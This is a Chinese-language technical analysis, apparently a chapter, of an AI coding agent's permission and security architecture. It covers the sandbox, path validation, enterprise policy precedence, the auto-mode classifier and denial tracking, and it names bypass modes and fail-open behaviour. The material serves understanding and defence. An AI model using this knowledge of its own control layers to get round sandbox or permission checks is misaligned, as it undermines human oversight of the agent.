这是一个务实的设计：子代理的拒绝计数不需要跨代理共享（每个代理的对话上下文不同，拒绝原因也不同），但单个代理内部的拒绝必须被追踪以防止死循环。

---

## 4.8 沙箱机制（Sandbox）

### 面临的问题

即使权限系统判断一个 Bash 命令是安全的（或用户手动放行了），命令的实际执行仍然可能造成损害——比如一个看似无害的 `npm install` 可能在 `postinstall` 脚本中执行恶意代码。

权限系统解决的是"**是否允许执行**"的问题，沙箱解决的是"**执行时限制什么**"的问题。

### 解法：sandbox-adapter + macOS Seatbelt

```typescript
// src/utils/sandbox/sandbox-adapter.ts

// SandboxManager 是对 @anthropic-ai/sandbox-runtime 的适配层
// 它桥接了外部沙箱包与 Claude CLI 的设置系统

export class SandboxManager extends BaseSandboxManager {
  // 核心能力：
  // 1. 文件系统读限制（FsReadRestrictionConfig）
  // 2. 文件系统写限制（FsWriteRestrictionConfig）
  // 3. 网络访问限制（NetworkRestrictionConfig）
  // 4. 违规事件记录（SandboxViolationStore）

  static isSandboxingEnabled(): boolean
  static isAutoAllowBashIfSandboxedEnabled(): boolean
}
```

沙箱的关键特性：

| 特性 | 说明 |
|------|------|
| 文件系统读限制 | 限制可读取的目录范围 |
| 文件系统写限制 | 限制可写入的目录范围（通常限于 cwd） |
| 网络限制 | 控制允许访问的网络主机 |
| 违规追踪 | 记录沙箱违规事件，用于审计 |
| 自动放行模式 | 当沙箱启用时，`Bash(*)` 的 ask 规则可被自动跳过 |

### 沙箱与权限系统的集成

沙箱与权限系统有一个精妙的交互——`autoAllowBashIfSandboxed`：

```typescript
// permissions.ts — Step 1b

const askRule = getAskRuleForTool(appState.toolPermissionContext, tool)
if (askRule) {
  // 当沙箱启用 + autoAllowBashIfSandboxed 开启 + 命令会在沙箱中执行
  const canSandboxAutoAllow =
    tool.name === BASH_TOOL_NAME &&
    SandboxManager.isSandboxingEnabled() &&
    SandboxManager.isAutoAllowBashIfSandboxedEnabled() &&
    shouldUseSandbox(input)

  if (!canSandboxAutoAllow) {
    return { behavior: 'ask', ... }  // 正常弹窗
  }
  // 跳过 ask 规则，让 tool.checkPermissions 处理具体命令
}
```

这意味着：如果用户配置了 `Bash` 的 `alwaysAsk` 规则（每个 Bash 命令都要确认），但同时启用了沙箱和 `autoAllowBashIfSandboxedEnabled`，那么**会在沙箱中执行的命令**可以跳过确认。用户选择显式绕过沙箱的命令（`dangerouslyDisableSandbox`）仍然需要确认。

---

## 4.9 文件系统安全：路径验证

### 面临的问题

即使工具被允许执行，也不意味着它可以访问文件系统的任意位置。LLM 可能尝试读取 `/etc/shadow`、修改 `~/.ssh/authorized_keys`、或写入工作目录之外的文件。

### 解法：路径边界检查

路径验证（`pathValidation.ts`）确保文件操作被限制在允许的范围内：

1. **工作目录边界**：默认只允许访问 `cwd` 及其子目录
2. **额外工作目录**：用户可以通过设置添加额外的允许目录
3. **safetyCheck 保护路径**：`.git/`、`.claude/`、`.vscode/`、shell 配置文件等特殊路径，即使在 bypass 模式下也需要确认

```typescript
// safetyCheck 的 decisionReason 有一个关键属性
type SafetyCheckReason = {
  type: 'safetyCheck'
  reason: string
  classifierApprovable: boolean  // auto 模式的分类器是否可以审批
}
```

`classifierApprovable` 是一个精细的控制：
- **true**：敏感文件路径（`.claude/`、`.git/`、shell 配置）——分类器可以根据上下文判断是否安全
- **false**：Windows 路径绕过尝试、跨机器 bridge 消息——这些是确定性的安全风险，不能交给分类器

---

## 4.10 企业管理设置（MDM & Policy）

### 面临的问题

企业环境下，IT 管理员需要：
1. **强制安全策略**：禁止某些危险操作，无论用户个人设置如何
2. **集中管理**：从一个中心位置下发配置，而不是逐台机器手动配置
3. **不可篡改**：员工不能通过修改本地配置来绕过企业策略

### 解法：多来源的策略优先级体系

```
┌─────────────────────────────────────────────────┐
│  最终生效的设置 = 所有层级合并的结果              │
│                                                  │
│  合并优先级（后者覆盖前者）：                      │
│  ① 插件基础设置 (plugin settings base)           │
│  ② userSettings   (~/.claude/settings.json)      │
│  ③ projectSettings (.claude/settings.json)       │
│  ④ localSettings  (.claude/settings.local.json)  │
│  ⑤ flagSettings   (SDK 内联 / feature flags)     │
│  ⑥ policySettings (企业策略 — 最高优先级)         │
└─────────────────────────────────────────────────┘
```

**policySettings 的内部优先级（first-source-wins）：**

```
policySettings 的来源选择（只取第一个非空来源）：
  1. Remote Managed Settings  → API 远程下发
  2. Admin MDM (plist/HKLM)   → 设备管理系统
  3. Managed Settings Files   → managed-settings.json + drop-ins
  4. Windows HKCU             → 用户级注册表
```

这是一个 **first-source-wins** 的设计——不是合并所有企业来源，而是只取最高优先级的那个。这简化了冲突解决逻辑，也让管理员可以确信"远程设置会覆盖一切"。

### Remote Managed Settings：动态企业策略

```typescript
// src/services/remoteManagedSettings/index.ts

// 关键行为：
// 1. 从 API 端点获取：${BASE_API_URL}/api/claude_code/settings
// 2. 缓存到磁盘：~/.claude/remote-settings.json（权限 600）
// 3. 每小时后台轮询刷新
// 4. 危险设置变更需要用户确认（securityCheck）
// 5. 网络不可用时使用过期缓存（fail-open）

const POLLING_INTERVAL_MS = 60 * 60 * 1000  // 1 小时
const SETTINGS_TIMEOUT_MS = 10000             // 10 秒超时
const LOADING_PROMISE_TIMEOUT_MS = 30000      // 30 秒加载超时
```

安全特性：
- **危险设置变更审批**：`securityCheck.tsx` 会在危险设置（如 hooks、sandbox 配置）发生变更时弹出确认对话框
- **Fail-open 设计**：如果远程服务不可用，使用本地缓存的上次设置，而非拒绝服务
- **权限控制**：缓存文件使用 `mode: 0o600`（只有所有者可读写）
- **Checksum 校验**：使用 SHA-256 校验设置内容，支持 304 Not Modified 优化

### Policy Limits：功能级开关

与 Remote Managed Settings（覆盖设置值）不同，Policy Limits 是一个独立的功能开关系统：

```typescript
// src/services/policyLimits/index.ts

// 端点：${BASE_API_URL}/api/claude_code/policy_limits
// 返回：{ restrictions: { "feature_name": { allowed: boolean } } }

export function isPolicyAllowed(policy: string): boolean {
  const restrictions = getRestrictions()
  if (!restrictions) {
    // 无限制数据时的行为
    if (isEssentialTrafficOnly && DENY_ON_MISS.has(policy)) {
      return false  // 关键功能缺失限制数据时拒绝
    }
    return true     // 一般情况 fail-open
  }
  const restriction = restrictions[policy]
  if (!restriction) return true  // 未提及 = 允许
  return restriction.allowed
}
```

### 设计决策讨论

**为什么 policySettings 是 first-source-wins 而不是合并所有来源？**

考虑一个场景：远程设置说 `"allowBash": true`，但本地 MDM 说 `"allowBash": false`。合并策略会产生歧义——谁的优先级更高？first-source-wins 消除了歧义：远程设置存在就用远程的，不关心本地 MDM 说什么。

**为什么 `allowManagedPermissionRulesOnly` 存在？**

```typescript
// permissions.ts
if (shouldAllowManagedPermissionRulesOnly()) {
  // 清除所有非 policy 来源的规则
  const sourcesToClear = ['userSettings', 'projectSettings', 'localSettings', ...]
}
```

这是一个企业级的"核选项"——当管理员启用 `allowManagedPermissionRulesOnly` 时，**只有企业策略中的权限规则生效**，用户自己添加的 allow/deny/ask 规则全部被清除。这确保了最严格的企业合规环境下，员工无法通过本地配置绕过任何策略。

---

## 4.11 总结：安全设计的核心原则

回顾整个权限与安全系统，可以提炼出以下设计原则：

### 1. 纵深防御（Defense in Depth）

没有单一的安全屏障。从信任边界→规则引擎→模式决策→分类器→沙箱→企业策略，每一层都独立工作。即使某一层被绕过（如用户选择 bypassPermissions），其他层（deny 规则、safetyCheck、沙箱）仍然提供保护。

### 2. 不可信输入原则

项目级配置（`.claude/settings.json`）被视为不可信输入。多个关键的安全设置——`skipDangerousModePermissionPrompt`、`autoModeOptIn`、`autoModeConfig`——**显式排除** projectSettings 作为来源。这防止了通过恶意仓库进行配置注入攻击。

### 3. Fail-Closed 优于 Fail-Open

- 分类器不可用时默认拒绝（`tengu_iron_gate_closed`）
- Denial tracking 达到限制时回退到手动审批
- 无头模式下无法弹窗时自动拒绝
- 信任未建立时不执行危险操作

### 4. 用户意图优先

用户显式配置的 deny/ask 规则在**任何模式**下都不可绕过——包括 bypassPermissions。safetyCheck 保护的关键路径同样是 bypass-immune。这确保了"用户说不"永远有效。

### 5. 渐进式信任

权限模式从最严格（default）到最宽松（bypassPermissions），用户可以根据信任程度逐步放开。auto 模式在中间地带——比手动确认快，但比完全放行安全。denial tracking 确保 auto 模式不会在错误路径上走太远。

### 6. 企业覆盖的绝对优先权

policySettings 是合并优先级链的最后一环，它覆盖一切用户和项目设置。`allowManagedPermissionRulesOnly` 更是可以清除所有非策略来源的规则。这给了企业管理员绝对的控制权。

---

## 关键源码索引

| 文件 | 职责 | 关键函数/导出 |
|------|------|-------------|
| `types/permissions.ts` | 权限类型定义（打破循环依赖） | `PermissionMode`, `PermissionRule`, `PermissionDecision`, `ToolPermissionContext` |
| `utils/permissions/PermissionMode.ts` | 权限模式配置与工具函数 | `permissionModeTitle()`, `getModeColor()` |
| `utils/permissions/getNextPermissionMode.ts` | 模式切换逻辑（Shift+Tab） | `getNextPermissionMode()`, `cyclePermissionMode()` |
| `utils/permissions/PermissionRule.ts` | 规则类型定义与 Schema | `permissionBehaviorSchema`, `permissionRuleValueSchema` |
| `utils/permissions/permissionRuleParser.ts` | 规则字符串解析 | `permissionRuleValueFromString()`, `permissionRuleValueToString()`, `escapeRuleContent()` |
| `utils/permissions/permissions.ts` | **核心权限检查逻辑** | `hasPermissionsToUseTool()`, `hasPermissionsToUseToolInner()`, `toolAlwaysAllowedRule()`, `getDenyRuleForTool()` |
| `hooks/useCanUseTool.tsx` | 权限检查 React Hook（连接规则引擎与 UI） | `useCanUseTool()` |
| `hooks/toolPermission/PermissionContext.ts` | 权限上下文与队列操作 | `createPermissionContext()`, `createPermissionQueueOps()` |
| `hooks/toolPermission/handlers/interactiveHandler.ts` | 交互式权限弹窗处理 | `handleInteractivePermission()` |
| `hooks/toolPermission/handlers/coordinatorHandler.ts` | 协调器模式权限处理 | `handleCoordinatorPermission()` |
| `hooks/toolPermission/handlers/swarmWorkerHandler.ts` | Swarm 模式权限转发 | `handleSwarmWorkerPermission()` |
| `utils/permissions/yoloClassifier.ts` | Auto 模式 AI 分类器 | `classifyYoloAction()`, `formatActionForClassifier()` |
| `utils/permissions/denialTracking.ts` | 拒绝计数熔断器 | `recordDenial()`, `recordSuccess()`, `shouldFallbackToPrompting()` |
| `utils/permissions/pathValidation.ts` | 路径边界检查 | 路径验证与安全检查 |
| `utils/permissions/filesystem.ts` | 文件系统权限 | 额外工作目录管理 |
| `utils/sandbox/sandbox-adapter.ts` | 沙箱适配层 | `SandboxManager` |
| `components/TrustDialog/TrustDialog.tsx` | 工作区信任对话框 | `TrustDialog` |
| `components/permissions/PermissionDialog.tsx` | 权限弹窗布局 | `PermissionDialog` |
| `components/permissions/PermissionRequest.tsx` | 工具到权限组件的路由 | `PermissionRequest` |
| `components/permissions/PermissionPrompt.tsx` | 权限选择交互组件 | `PermissionPrompt` |
| `services/remoteManagedSettings/index.ts` | 远程企业设置服务 | `loadRemoteManagedSettings()`, `refreshRemoteManagedSettings()` |
| `services/remoteManagedSettings/securityCheck.tsx` | 远程设置安全审批 | `checkManagedSettingsSecurity()` |
| `services/policyLimits/index.ts` | 功能级策略限制 | `isPolicyAllowed()`, `loadPolicyLimits()` |
| `utils/settings/mdm/settings.ts` | MDM 设置解析与缓存 | `getMdmSettings()`, `startMdmSettingsLoad()` |
| `utils/settings/settings.ts` | 设置层级合并 | `loadSettingsFromDisk()`, `getSettingsForSource()`, `hasSkipDangerousModePermissionPrompt()` |
